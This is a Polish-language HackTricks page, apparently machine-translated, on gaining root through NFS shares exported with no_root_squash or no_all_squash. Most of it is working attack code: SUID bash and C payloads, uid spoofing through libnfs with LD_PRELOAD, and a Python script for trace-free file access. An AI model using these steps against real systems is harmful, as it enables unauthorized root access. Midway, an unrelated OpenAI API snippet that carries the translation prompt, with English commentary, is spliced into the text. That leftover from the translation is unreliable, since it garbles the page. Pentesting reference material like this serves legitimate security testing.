<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


Przeczytaj plik _ **/etc/exports** _, jeśli znajdziesz katalog skonfigurowany jako **no\_root\_squash**, będziesz mógł **uzyskać do niego dostęp** jako **klient** i **zapisywać wewnątrz** tego katalogu **tak, jakbyś był lokalnym użytkownikiem root na maszynie**.

**no\_root\_squash**: Ta opcja daje uprawnienia użytkownikowi root na kliencie do dostępu do plików na serwerze NFS jako root. Może to prowadzić do poważnych zagrożeń dla bezpieczeństwa.

**no\_all\_squash:** Jest to podobna opcja do **no\_root\_squash**, ale dotyczy **użytkowników nie będących rootem**. Wyobraź sobie, że masz powłokę jako użytkownik nobody; sprawdzasz plik /etc/exports; opcja no\_all\_squash jest obecna; sprawdzasz plik /etc/passwd; emulujesz użytkownika nie będącego rootem; tworzysz plik suid jako tego użytkownika (poprzez montowanie za pomocą nfs). Wykonaj suid jako użytkownik nobody i stań się innym użytkownikiem.

# Eskalacja uprawnień

## Eksploitacja zdalna

Jeśli znalazłeś tę podatność, możesz ją wykorzystać:

* **Zamontuj ten katalog** na maszynie klienta i **jako root skopiuj** do zamontowanego folderu binarny plik **/bin/bash** i nadaj mu uprawnienia **SUID**, a następnie **wykonaj z maszyny ofiary** ten binarny plik bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montowanie tego katalogu** na maszynie klienta i **jako root kopiowanie** skompilowanego payloadu do zamontowanego folderu, który wykorzysta uprawnienia SUID, nadaje mu prawa SUID i **wykonuje na maszynie ofiary** ten plik binarny (możesz tutaj znaleźć kilka [payloadów C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Lokalne wykorzystanie

{% hint style="info" %}
Zauważ, że jeśli możesz utworzyć **tunel z twojego komputera do komputera ofiary, nadal możesz użyć zdalnej wersji, aby wykorzystać podwyższenie uprawnień, tunelując wymagane porty**.\
Następujący trik jest w przypadku, gdy plik `/etc/exports` **wskazuje na adres IP**. W tym przypadku nie będziesz w stanie w żadnym przypadku użyć **zdalnego wykorzystania** i będziesz musiał **wykorzystać ten trik**.\
Innym wymaganym warunkiem, aby wykorzystanie działało, jest to, że **eksport wewnątrz `/etc/export` musi używać flagi `insecure`**.\
\--_Nie jestem pewien, czy jeśli `/etc/export` wskazuje na adres IP, ten trik zadziała_--
{% endhint %}

## Podstawowe informacje

Scenariusz polega na wykorzystaniu zamontowanego udziału NFS na lokalnym komputerze, wykorzystując luki w specyfikacji NFSv3, które umożliwiają klientowi określenie swojego uid/gid, co potencjalnie umożliwia nieautoryzowany dostęp. Wykorzystanie polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki umożliwiającej fałszowanie wywołań RPC NFS.

### Kompilacja biblioteki

Kroki kompilacji biblioteki mogą wymagać dostosowania w zależności od wersji jądra. W tym konkretnym przypadku wywołania systemowe fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Przeprowadzanie ataku

Atak polega na stworzeniu prostego programu w języku C (`pwn.c`), który podnosi uprawnienia do roota, a następnie uruchamia powłokę. Program jest kompilowany, a wynikowy plik binarny (`a.out`) jest umieszczany na udziale z suid root, używając `ld_nfs.so` do podrobienia uid w wywołaniach RPC:

1. **Skompiluj kod ataku:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Umieść atak na udziale i zmodyfikuj jego uprawnienia, podrobiąc uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Uruchom atak, aby uzyskać uprawnienia roota:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell do dyskretnego dostępu do plików
Po uzyskaniu dostępu roota, aby komunikować się z udziałem NFS bez zmieniania właściciela (aby uniknąć pozostawiania śladów), używany jest skrypt w języku Python (nfsh.py). Skrypt ten dostosowuje uid, aby pasował do uid pliku, z którym się komunikuje, umożliwiając interakcję z plikami na udziale bez problemów z uprawnieniami:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
```python
import requests

url = "https://api.openai.com/v1/engines/davinci-codex/completions"

headers = {
    "Authorization": "Bearer YOUR_API_KEY",
    "Content-Type": "application/json"
}

data = {
    "prompt": "The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md. Translate the relevant English text to Polish and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, AWS, GCP...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.",
    "max_tokens": 100,
    "temperature": 0.7,
    "stop": "\n"
}

response = requests.post(url, headers=headers, json=data)
translation = response.json()["choices"][0]["text"]

print(translation)
```

This code snippet makes a POST request to the OpenAI API to translate the given English text to Polish. The `YOUR_API_KEY` placeholder should be replaced with your actual API key. The translated text is then printed to the console.
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Odwołania
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
